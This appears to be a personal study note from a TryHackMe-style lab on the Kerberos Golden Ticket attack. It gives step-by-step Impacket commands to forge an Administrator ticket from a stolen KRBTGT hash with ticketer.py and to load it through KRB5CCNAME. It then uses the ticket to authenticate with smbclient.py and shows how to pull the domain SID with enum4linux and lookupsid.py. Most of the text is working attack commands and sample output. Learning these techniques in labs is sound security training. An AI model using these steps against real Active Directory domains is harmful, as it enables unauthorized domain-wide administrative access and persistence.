# Golden Ticket

A **Golden Ticket** is created using the **KRBTGT NTLM hash**.

If the KRBTGT hash is compromised, an attacker can forge TGTs for users such as `Administrator`.

### Forge TGT
```bash
ticketer.py \
-nthash <KRBTGT_HASH> \
-domain-sid <DOMAIN_SID> \
-domain thm.loc \
Administrator
```
the tool path --> /home/eyad/.local/share/pipx/venvs/impacket/bin

- `-nthash` → KRBTGT NT hash.
- `-domain-sid` → Domain SID.
- `-domain` → AD domain.
- `Administrator` → User the forged ticket represents.

Output:
```text
Administrator.ccache
```
### Use the Forged Ticket
```bash
export KRB5CCNAME=Administrator.ccache
```
Tells Kerberos tools to use the forged ticket.
### Authenticate
```bash
smbclient.py thm.loc/Administrator@SERVER1.thm.loc \
-k -no-pass -dc-ip 192.168.11.100
```

- `-k` → Kerberos authentication.
- `-no-pass` → Don't use a password.
- `-dc-ip` → Specify the DC.
- **Hostname required** → Kerberos uses SPNs/DNS.
    
**Concept:**
```text
KRBTGT Hash
     ↓
Forge TGT
     ↓
Administrator.ccache
     ↓
Kerberos Authentication
     ↓
Domain-Level Access
```

**Why This Works:** All Kerberos TGTs are encrypted and signed using the KRBTGT account's password hash. If an attacker obtains this hash, they can forge tickets that the domain controllers will accept as legitimate. The forged tickets can grant any level of access and are virtually indistinguishable from legitimate tickets.

---
## Get Domain SID

### From Linux with enum4linux

### `enum4linux`
```
enum4linux -S <DC-IP>
```

or run the full enumeration:
```
enum4linux -a <DC-IP>
```

Look for something like:
```
Domain SID: S-1-5-21-123456789-987654321-111111111
```

### From Linux with Impacket

If you have valid domain credentials:
```bash
lookupsid.py thm.loc/user:password@192.168.11.100
```

The output will contain the domain SID, for example:
```text
[*] Brute forcing SIDs
[*] StringBinding ncacn_np:192.168.11.100[\pipe\lsarpc]
S-1-5-21-990021728-513958382-3715561918-500 THM\Administrator
```

So:
```text
Domain SID = S-1-5-21-990021728-513958382-3715561918
```

